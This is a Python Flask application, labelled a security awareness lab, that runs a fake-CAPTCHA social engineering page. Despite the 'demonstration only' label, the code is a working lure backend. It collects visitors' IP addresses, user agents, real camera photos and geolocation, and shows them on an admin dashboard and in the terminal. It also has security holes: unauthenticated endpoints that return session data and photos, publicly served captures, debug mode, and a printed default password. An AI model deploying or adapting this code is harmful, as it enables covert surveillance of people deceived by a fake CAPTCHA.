"""
AUTHORIZED SECURITY AWARENESS LAB — DEMONSTRATION ONLY
--------------------------------------------------------
Fake-CAPTCHA / ClickFix-style social engineering simulator.
Terminal & Dashboard integration with security controls.
"""

import os
import uuid
import datetime
import random
import time
import json
import hashlib
from functools import wraps
from flask import (
    Flask, render_template, request, jsonify,
    session, send_from_directory, redirect, url_for
)
from werkzeug.security import check_password_hash, generate_password_hash
from PIL import Image, ImageDraw, ImageFont
import io
import base64

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Konfigurasi
CAPTURES_DIR = os.path.join(os.path.dirname(__file__), "data", "captures")
os.makedirs(CAPTURES_DIR, exist_ok=True)

# Admin credentials (bisa di-set lewat environment)
ADMIN_USERNAME = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "labpass123")
ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)

# Rate limiter sederhana (per IP)
RATE_LIMIT = {}
RATE_LIMIT_WINDOW = 60  # detik
RATE_LIMIT_MAX = 30     # request per window

# In-memory session store
SESSIONS = {}
# Audit log
AUDIT_LOG = []

def now_iso():
    return datetime.datetime.utcnow().isoformat() + "Z"

def rate_limit(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        ip = request.remote_addr
        now = time.time()
        if ip not in RATE_LIMIT:
            RATE_LIMIT[ip] = []
        # bersihkan request lama
        RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < RATE_LIMIT_WINDOW]
        if len(RATE_LIMIT[ip]) >= RATE_LIMIT_MAX:
            return jsonify({"error": "Rate limit exceeded"}), 429
        RATE_LIMIT[ip].append(now)
        return f(*args, **kwargs)
    return decorated

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("admin"):
            # Jika request JSON, return 401, else redirect ke login
            if request.path.startswith("/api/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

def log_activity(message, session_id=None):
    entry = {
        "timestamp": now_iso(),
        "message": message,
        "session_id": session_id,
        "ip": request.remote_addr if request else "CLI",
    }
    AUDIT_LOG.append(entry)
    print(f"[LOG] {entry['timestamp']} - {message}")

def get_or_create_session():
    sid = session.get("lab_session_id")
    if not sid or sid not in SESSIONS:
        sid = str(uuid.uuid4())
        session["lab_session_id"] = sid
        SESSIONS[sid] = {
            "session_id": sid,
            "created_at": now_iso(),
            "status": "INITIALIZED",
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", "unknown"),
            "camera_permission": "PENDING",
            "location_permission": "PENDING",
            "photo_path": None,
            "photo_is_simulated": False,
            "location": None,
            "location_is_simulated": False,
            "screen": None,
            "updated_at": now_iso(),
            "captcha_verified": False,
            "recapture_count": 0,
        }
    return sid

def print_session_summary(sid, extra=""):
    data = SESSIONS.get(sid)
    if not data:
        return
    print("\n" + "="*60)
    print(f"📋 SESSION UPDATE — {sid}")
    print("="*60)
    print(f"  Status      : {data.get('status')}")
    print(f"  IP          : {data.get('ip')}")
    print(f"  User-Agent  : {data.get('user_agent')[:50]}...")
    print(f"  Camera      : {data.get('camera_permission')}")
    print(f"  Location    : {data.get('location_permission')}")
    loc = data.get('location')
    if loc and loc.get('latitude'):
        print(f"  Lat/Long    : {loc.get('latitude')}, {loc.get('longitude')} (acc: {loc.get('accuracy')}m)")
    if data.get('photo_path'):
        print(f"  Photo       : data/captures/{data.get('photo_path')}")
    print(f"  Captcha     : {'✅' if data.get('captcha_verified') else '❌'}")
    print(f"  Recaptures  : {data.get('recapture_count', 0)}")
    if extra:
        print(f"  {extra}")
    print("="*60 + "\n")

# ========== AUTH ROUTES ==========
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session["admin"] = True
            log_activity(f"Admin login from {request.remote_addr}")
            return redirect(url_for("dashboard"))
        else:
            return render_template("login.html", error="Invalid credentials")
    return render_template("login.html", error=None)

@app.route("/logout")
def logout():
    session.pop("admin", None)
    log_activity("Admin logout")
    return redirect(url_for("login"))

# ========== MAIN ROUTES ==========
@app.route("/")
def index():
    get_or_create_session()
    return render_template("captcha.html", recapture=False)

@app.route("/recapture")
def recapture():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    data["recapture_count"] = data.get("recapture_count", 0) + 1
    log_activity(f"Recapture triggered for {sid}", sid)
    print_session_summary(sid, "🔄 RECAPTURE triggered via /recapture")
    return render_template("captcha.html", recapture=True)

@app.route("/dashboard")
@login_required
def dashboard():
    log_activity("Dashboard accessed")
    return render_template("dashboard.html")

# ========== API CAPTCHA ==========
@app.route("/api/captcha/verify", methods=["POST"])
@rate_limit
def captcha_verify():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    delay = random.uniform(0.5, 1.5)
    time.sleep(delay)
    data["captcha_verified"] = True
    data["status"] = "CAPTCHA_VERIFIED"
    data["updated_at"] = now_iso()
    log_activity(f"CAPTCHA verified for {sid}", sid)
    print_session_summary(sid, "✅ CAPTCHA verified")
    return jsonify({"success": True, "session_id": sid})

@app.route("/api/photo", methods=["POST"])
@rate_limit
def api_photo():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    is_simulated = request.form.get("simulated", "false").lower() == "true"
    if is_simulated:
        data["photo_path"] = None
        data["photo_is_simulated"] = True
        data["camera_permission"] = "GRANTED (SIMULATED)"
        data["updated_at"] = now_iso()
        log_activity(f"SIMULATED photo for {sid}", sid)
        return jsonify({"ok": True, "simulated": True})
    file = request.files.get("photo")
    if not file:
        return jsonify({"ok": False, "error": "no photo provided"}), 400
    # Validasi file
    if file.content_type not in ["image/jpeg", "image/png", "image/webp"]:
        return jsonify({"ok": False, "error": "invalid file type"}), 400
    if file.content_length and file.content_length > 5 * 1024 * 1024:
        return jsonify({"ok": False, "error": "file too large"}), 400
    filename = f"{sid}_{int(time.time())}.jpg"
    filepath = os.path.join(CAPTURES_DIR, filename)
    file.save(filepath)
    data["photo_path"] = filename
    data["photo_is_simulated"] = False
    data["camera_permission"] = "GRANTED"
    data["updated_at"] = now_iso()
    log_activity(f"PHOTO saved: {filename} for {sid}", sid)
    print_session_summary(sid, f"📸 PHOTO saved: {filename}")
    return jsonify({"ok": True, "simulated": False})

@app.route("/api/location", methods=["POST"])
@rate_limit
def api_location():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    payload = request.get_json(silent=True) or {}
    is_simulated = bool(payload.get("simulated", False))
    data["location"] = {
        "latitude": payload.get("latitude"),
        "longitude": payload.get("longitude"),
        "accuracy": payload.get("accuracy"),
        "timestamp": payload.get("timestamp", now_iso()),
    }
    data["location_is_simulated"] = is_simulated
    data["location_permission"] = "GRANTED (SIMULATED)" if is_simulated else "GRANTED"
    data["updated_at"] = now_iso()
    log_activity(f"LOCATION: {payload.get('latitude')}, {payload.get('longitude')} for {sid}", sid)
    return jsonify({"ok": True, "simulated": is_simulated})

@app.route("/api/permission_denied", methods=["POST"])
@rate_limit
def api_permission_denied():
    sid = get_or_create_session()
    data = SESSIONS[sid]
    payload = request.get_json(silent=True) or {}
    kind = payload.get("kind")
    if kind == "camera":
        data["camera_permission"] = "DENIED"
    elif kind == "location":
        data["location_permission"] = "DENIED"
    data["updated_at"] = now_iso()
    log_activity(f"PERMISSION DENIED: {kind} for {sid}", sid)
    return jsonify({"ok": True})

# ========== DASHBOARD API (dengan autentikasi) ==========
@app.route("/api/dashboard/sessions")
@login_required
def api_dashboard_sessions():
    """Kembalikan semua sesi untuk dashboard."""
    return jsonify(list(SESSIONS.values()))

@app.route("/api/dashboard/logs")
@login_required
def api_dashboard_logs():
    """Kembalikan audit log."""
    return jsonify(AUDIT_LOG[-100:])  # 100 terakhir

@app.route("/api/dashboard/replay", methods=["POST"])
@login_required
@rate_limit
def api_dashboard_replay():
    """Generate synthetic capture untuk sesi yang diberikan."""
    data = request.get_json(silent=True) or {}
    sid = data.get("session_id")
    if not sid or sid not in SESSIONS:
        return jsonify({"error": "invalid session"}), 400
    sess = SESSIONS[sid]
    # Generate synthetic image
    img = Image.new('RGB', (320, 240), color=(73, 109, 137))
    d = ImageDraw.Draw(img)
    d.text((10, 10), f"REPLAY {sid[:8]}", fill=(255, 255, 0))
    d.text((10, 30), now_iso(), fill=(255, 255, 255))
    # Simpan ke buffer
    buf = io.BytesIO()
    img.save(buf, format='JPEG')
    buf.seek(0)
    # Simpan file
    filename = f"replay_{sid}_{int(time.time())}.jpg"
    filepath = os.path.join(CAPTURES_DIR, filename)
    with open(filepath, 'wb') as f:
        f.write(buf.getvalue())
    sess["photo_path"] = filename
    sess["photo_is_simulated"] = True
    sess["camera_permission"] = "GRANTED (REPLAY)"
    sess["updated_at"] = now_iso()
    sess["recapture_count"] = sess.get("recapture_count", 0) + 1
    log_activity(f"REPLAY generated for {sid}", sid)
    return jsonify({"ok": True, "filename": filename})

# ========== CLI API (tanpa auth, karena localhost) ==========
@app.route("/api/cli/status/<sid>")
@rate_limit
def cli_status(sid):
    if sid not in SESSIONS:
        return jsonify({"error": "session not found"}), 404
    return jsonify(SESSIONS[sid])

@app.route("/api/cli/capture-result/<sid>")
@rate_limit
def cli_capture_result(sid):
    if sid not in SESSIONS:
        return jsonify({"error": "session not found"}), 404
    sess = SESSIONS[sid]
    if sess.get("photo_path"):
        # Base64 encode gambar
        filepath = os.path.join(CAPTURES_DIR, sess["photo_path"])
        if os.path.exists(filepath):
            with open(filepath, "rb") as f:
                b64 = base64.b64encode(f.read()).decode('utf-8')
            return jsonify({"ok": True, "image_base64": b64})
    return jsonify({"ok": False, "error": "no photo available"})

@app.route("/api/cli/replay/<sid>")
@rate_limit
def cli_replay(sid):
    if sid not in SESSIONS:
        return jsonify({"error": "session not found"}), 404
    # Panggil endpoint replay internal
    with app.test_request_context('/api/dashboard/replay', json={"session_id": sid}):
        resp = api_dashboard_replay()
        return resp

# ========== SERVING CAPTURES ==========
@app.route("/data/captures/<path:filename>")
def serve_capture(filename):
    return send_from_directory(CAPTURES_DIR, filename)

# ========== CLEANUP ==========
@app.route("/api/delete", methods=["POST"])
@login_required
def api_delete():
    sid = get_or_create_session()
    data = SESSIONS.get(sid)
    if data and data.get("photo_path"):
        filepath = os.path.join(CAPTURES_DIR, data["photo_path"])
        if os.path.exists(filepath):
            os.remove(filepath)
    SESSIONS.pop(sid, None)
    session.pop("lab_session_id", None)
    log_activity(f"Deleted session {sid}")
    print(f"🗑️ Session {sid} deleted.")
    return jsonify({"ok": True, "message": "Demo data deleted."})

@app.route("/api/clear_all", methods=["POST"])
@login_required
def clear_all():
    count = len(SESSIONS)
    for sid, data in list(SESSIONS.items()):
        if data.get("photo_path"):
            filepath = os.path.join(CAPTURES_DIR, data["photo_path"])
            if os.path.exists(filepath):
                os.remove(filepath)
    SESSIONS.clear()
    session.clear()
    AUDIT_LOG.clear()
    log_activity(f"Cleared all {count} sessions")
    print(f"🗑️ All {count} sessions cleared.")
    return jsonify({"ok": True, "message": f"Cleared {count} sessions."})

# ========== MAIN ==========
if __name__ == "__main__":
    print("="*70)
    print(" AUTHORIZED SECURITY AWARENESS LAB — DEMONSTRATION ONLY")
    print(" Running on localhost. Data akan dicetak di terminal ini.")
    print(f" Dashboard login: admin / {ADMIN_PASSWORD}")
    print(" Dashboard: http://127.0.0.1:5000/dashboard")
    print(" Recapture: http://127.0.0.1:5000/recapture")
    print("="*70)
    app.run(host="127.0.0.1", port=5000, debug=True)